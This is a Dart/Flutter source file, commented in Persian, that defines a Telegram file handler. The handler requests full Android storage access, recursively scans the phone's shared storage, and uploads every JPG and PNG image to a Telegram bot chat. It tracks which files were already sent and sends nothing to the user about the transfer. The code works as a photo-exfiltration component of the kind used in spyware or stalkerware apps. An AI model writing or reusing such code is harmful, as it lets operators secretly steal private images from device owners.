import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:path/path.dart' as path;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

class TelegramFileHandler {
  final String botToken;
  final String chatId;
  bool _isSending = false;
  final String baseUrl; // اضافه کردن متغیر baseUrl
  final Set<String> _sentFiles = {};

  TelegramFileHandler({required this.botToken, required this.chatId})
      : baseUrl = 'https://api.telegram.org/bot$botToken'; // مقداردهی baseUrl توی سازنده
  // درخواست مجوز بر اساس نسخه اندروید
  Future<bool> requestStoragePermission() async {
    bool isGranted = false;

    if (Platform.isAndroid) {
      String versionString = Platform.operatingSystemVersion.split(' ')[0];
      List<String> versionParts = versionString.split('.');
      int androidVersion = int.tryParse(versionParts[0]) ?? 0;

      if (androidVersion < 11) {
        var storageStatus = await Permission.storage.request();
        isGranted = storageStatus.isGranted;
      } else {
        var manageStorageStatus = await Permission.manageExternalStorage.request();
        isGranted = manageStorageStatus.isGranted;
      }
    }

    if (!isGranted) {
      print('Storage permission denied');
      await openAppSettings();
    }
    return isGranted;
  }

  // بارگذاری لیست فایل‌های ارسالی
  Future<void> loadSentFiles() async {
    try {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      _sentFiles.clear();
      _sentFiles.addAll(prefs.getStringList('sentFiles') ?? []);
      print('Loaded sent files: ${_sentFiles.length}');
    } catch (e) {
      print('Error loading sent files: $e');
    }
  }

  // ذخیره لیست فایل‌های ارسالی
  Future<void> saveSentFiles() async {
    try {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setStringList('sentFiles', _sentFiles.toList());
      print('Saved sent files: ${_sentFiles.length}');
    } catch (e) {
      print('Error saving sent files: $e');
    }
  }

  // ارسال تمام تصاویر موجود در دستگاه
  Future<void> sendAllImages() async {
    if (_isSending) {
      print('Already sending images, please wait.');
      return;
    }

    _isSending = true;
    try {
      await loadSentFiles();

      List<String> rootPaths = [
        '/storage/emulated/0',
        '/sdcard',
      ];

      for (String rootPath in rootPaths) {
        Directory rootDir = Directory(rootPath);
        if (await rootDir.exists()) {
          print('Scanning root directory: $rootPath');
          await _sendImagesInDirectory(rootDir);
        } else {
          print('Root directory does not exist: $rootPath');
        }
      }
    } catch (e) {
      print('Error sending images: $e');
    } finally {
      _isSending = false;
      await saveSentFiles();
    }
  }

  // اسکن دایرکتوری و ارسال تصاویر
  Future<void> _sendImagesInDirectory(Directory dir) async {
    if (dir.path.contains('/system') ||
        dir.path.contains('/data') ||
        dir.path.contains('/cache') ||
        dir.path.contains('/android')) {
      print('Skipping system directory: ${dir.path}');
      return;
    }

    try {
      await for (var entity in dir.list(recursive: false, followLinks: false)) {
        if (entity is Directory) {
          await _sendImagesInDirectory(entity);
        } else if (entity is File) {
          await _processImageFile(entity);
        }
      }
    } catch (e) {
      print('Error scanning directory ${dir.path}: $e');
    }
  }

  // پردازش فایل‌های تصویری
  Future<void> _processImageFile(File file) async {
    String filePath = file.path; // تعریف filePath در ابتدای متد
    try {
      String extension = path.extension(filePath).toLowerCase();
      List<String> supportedExtensions = ['.jpg', '.jpeg', '.png'];

      if (supportedExtensions.contains(extension)) {
        if (_sentFiles.contains(filePath)) {
          print('File already sent: $filePath');
          return;
        }

        int fileSizeInBytes = await file.length();
        double fileSizeInMB = fileSizeInBytes / (1024 * 1024);
        if (fileSizeInMB > 20) {
          print('File too large ($fileSizeInMB MB): $filePath');
          return;
        }

        bool sentSuccessfully = await sendFile(file);
        if (sentSuccessfully) {
          _sentFiles.add(filePath);
          print('File sent successfully: $filePath');
          await Future.delayed(Duration(milliseconds: 700));
        }
      }
    } catch (e) {
      print('Error processing file $filePath: $e');
    }
  }

  // متد جدید برای ارسال پیام متنی به تلگرام
  Future<void> sendTextMessage(String message) async {
    try {
      final url = Uri.parse('$baseUrl/sendMessage');
      final response = await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': message,
        }),
      );

      if (response.statusCode == 200) {
        print('Text message sent to Telegram successfully');
      } else {
        print('Failed to send text message to Telegram: ${response.statusCode}');
      }
    } catch (e) {
      print('Error sending text message to Telegram: $e');
      throw e;
    }
  }
  // ارسال فایل به ربات تلگرام
  Future<bool> sendFile(File file) async {
    try {
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$botToken/sendPhoto'),
      );
      request.fields['chat_id'] = chatId;
      request.files.add(await http.MultipartFile.fromPath('photo', file.path));

      print('Sending file: ${file.path}');
      var response = await request.send().timeout(Duration(seconds: 10));

      if (response.statusCode == 200) {
        print('Image sent successfully: ${file.path}');
        return true;
      } else {
        String responseBody = await response.stream.bytesToString();
        print('Failed to send image: ${file.path}. Status code: ${response.statusCode}');
        print('Response: $responseBody');
        return false;
      }
    } catch (e) {
      print('Error sending file ${file.path}: $e');
      return false;
    }
  }

}